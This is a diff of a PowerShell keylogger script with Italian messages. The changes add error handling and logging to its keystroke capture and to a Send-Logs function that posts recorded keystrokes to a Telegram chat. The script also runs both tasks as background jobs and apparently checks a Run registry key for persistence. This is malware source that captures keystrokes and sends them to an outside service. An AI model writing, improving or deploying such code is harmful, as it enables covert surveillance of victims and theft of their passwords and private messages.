@@ -18,7 +18,8 @@ if (-Not (Test-Path $tempFile)) {
 function Start-Keylogger {
     Write-Host "Start-Keylogger avviato"
 
-    Add-Type @"
+    try {
+        Add-Type @"
 using System;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
@@ -39,7 +40,11 @@ public class KeyboardTracker {
     }
 }
 "@
-    Write-Host "Add-Type completato"
+        Write-Host "Add-Type completato"
+    } catch {
+        Write-Host "Errore durante Add-Type: $_"
+        return
+    }
 
     while ($true) {
         Start-Sleep -Milliseconds 100  # Intervallo per ridurre il carico della CPU
@@ -50,7 +55,7 @@ public class KeyboardTracker {
                 Write-Host "Tasti registrati: $keys"
             }
         } catch {
-            Write-Host "Errore nella registrazione dei tasti: $_"
+            Write-Host "Errore durante la registrazione dei tasti: $_"
             Start-Sleep -Seconds 5
         }
     }
@@ -65,6 +70,7 @@ function Send-Logs {
             if (Test-Path $tempFile) {
                 $logs = Get-Content -Path $tempFile -Raw
                 if ($logs -ne "") {
+                    Write-Host "Tentativo di invio log a Telegram"
                     $body = @{
                         chat_id = $chatId
                         text = $logs
@@ -73,8 +79,14 @@ function Send-Logs {
                     if ($response.StatusCode -eq 200) {
                         Write-Host "Log inviato con successo a Telegram"
                         Clear-Content -Path $tempFile
+                    } else {
+                        Write-Host "Errore durante l'invio, codice HTTP: $($response.StatusCode)"
                     }
+                } else {
+                    Write-Host "Nessun log da inviare"
                 }
+            } else {
+                Write-Host "File log non trovato: $tempFile"
             }
         } catch {
             Write-Host "Errore durante l'invio a Telegram: $_"
@@ -92,3 +104,4 @@ if (-Not (Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Keylogg
 # Avvia il keylogger e l'invio dei log in background
 Start-Job -ScriptBlock { Start-Keylogger }
 Start-Job -ScriptBlock { Send-Logs }
+
